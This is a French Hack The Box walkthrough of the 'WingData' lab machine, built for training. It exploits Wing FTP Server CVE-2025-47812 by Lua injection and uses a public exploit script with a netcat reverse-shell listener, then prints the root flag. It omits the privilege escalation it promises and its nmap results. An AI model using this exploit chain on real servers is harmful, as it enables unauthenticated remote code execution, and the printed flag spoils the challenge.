# **WingData**

Difficulté : Easy

OS: Linux

Plateforme: HTB Saison 10

### Summary

`WingData` est une machine `hackthebox` focalisée sur l’exploitation d’un site web qui utilise une version vulnérable de `Wing FTP Server`  puis l’escalade de privilège via l’exploitation d’un script de backups qui utilise une version de python vulnérable à l’exploitation de la commande `tar`.

### Host Resolution

Nous allons commencer par associer l’adresse ip de notre cible au nom de domaine `wingdata.htb` 

```bash
echo "10.129.24.65 wingdata.htb" >> /etc/hosts
```

### Nmap Scan

La reconnaissance a débuté par un scan `nmap` de la cible afin de déterminer les ports ouverts

```bash
nmap -sC -sV -p- wingdata.htb
```

On a obtenu


Le scan révèle la présence de deux ports :

- Port SSH (22)

### **Web application Discovery**

Après l’identification du port 80 comme principale surface d'attaque lors de l'analyse `Nmap`, nous avons interagi avec ce port via le navigateur à l’adresse

```
http://wingdata.htb
```

![image.png](attachment:455de882-5fd3-4924-80ec-a5e0bd9c2a6a:image.png)

La page d’accueil présente une entreprise nommée `WINGDATA` qui permet aux développeurs de collaborer entre eux en permettant un partage sécurisé des fichiers. Le site affiche en haut à droite le bouton `Client Portal`. Lorsque l’on clique sur ce bouton nous sommes redirigés à l’adresse

```
http://ftp.wingdata.htb/login.html
```

Nous avons donc découvert l’existence du sous-domaine `ftp.wingdata.htb`. Etant donné que ce sous-domaine n’est pas associé à une adresse ip notre navigateur n’arrive pas à le joindre. Ajoutons le à notre fichier `/etc/hosts`

```bash
nano /etc/hosts
10.129.24.65 wingdata.htb ftp.wingdata.htb
```

Nous pouvons donc actualiser la page

![image.png](attachment:ab23f07e-5e8f-42f8-a324-6e9cf896ffc9:image.png)

Il s’agit d’une page de connexion. Tout en bas il nous est indiqué que le site utilise la version  `v7.4.3` de Wing FTP Server. Cette version présente une vulnérabilité de **Unauthenticated Remote Code Execution** (`CVE-2025-47812`). La faille exploite une mauvaise gestion des caractères spéciaux dans le paramètre `username` lors du processus de connexion.
Pour l’exploiter, on  envoie une requête de connexion au point de terminaison `/loginok.html` avec un nom d'utilisateur contenant un octet nul `(\0)` suivi de code malveillant en langage `Lua` . Une fois le fichier de session `empoisonné`, on déclenche l'exécution de ce fichier via une seconde requête HTTP. Comme Wing FTP utilise Lua pour ses fonctions internes, le serveur interprète et exécute le code injecté.

### CVE-2025-47812 exploitation

Pour exploiter cette vulnérabilité nous allons utiliser le script de l’utilisateur `pevinkumar10` disponible sur **Github**

```bash
git clone https://github.com/pevinkumar10/CVE-2025-47812
cd CVE-2025-47812
pip3 install -r requirements.txt
```

Nous allons lancer un écouteur déterminer notre adresse ip puis lancer un écouteur

```bash
# ip a
...
inet 10.10.15.170/23
...
# nc -lvnp 9001
```

Nous allons ensuite lancer le script avec les bons arguments

```bash
 python3 exploit.py --target http://ftp.wingdata.htb --lhost 10.10.15.170 --lport 9001
```

On obtient un shell sur la machine

### Capture Root Flag

Une fois le shell root obtenu nous allons récupérer le root flag

```bash
root@wingdata:~# ls /root
root.txt
root@wingdata:~# cat /root/root.txt 
7f4a91fc19e4cb9179878bc6269fb46f
```

⛳ **Root Flag** : `7f4a91fc19e4cb9179878bc6269fb46f`
